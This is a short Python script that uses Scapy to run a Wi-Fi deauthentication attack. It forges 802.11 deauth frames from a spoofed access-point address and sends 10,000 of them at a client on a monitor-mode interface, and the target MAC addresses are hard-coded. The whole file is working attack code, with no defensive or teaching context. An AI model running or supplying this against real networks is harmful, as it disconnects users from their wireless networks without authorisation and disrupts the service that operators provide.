import os
from scapy.all import *
import time


def DeauthAttack(interface, device_target, client_target):
	'''
	DeauthAttack function - Start the deauth attack by given interface, AP mac address and client MAC address.
	'''
	print('Deauthing',client_target,'from',device_target,'...')
	pkt = RadioTap() / Dot11( addr1 = client_target, addr2 = device_target, addr3 = device_target, type=0, subtype= 12) / Dot11Deauth()
	sendp(pkt, iface = interface, count = 10000, inter = .2)

DeauthAttack("wlan0mon", "48:2C:A0:6B:05:34", "68:FF:7B:3D:EE:76")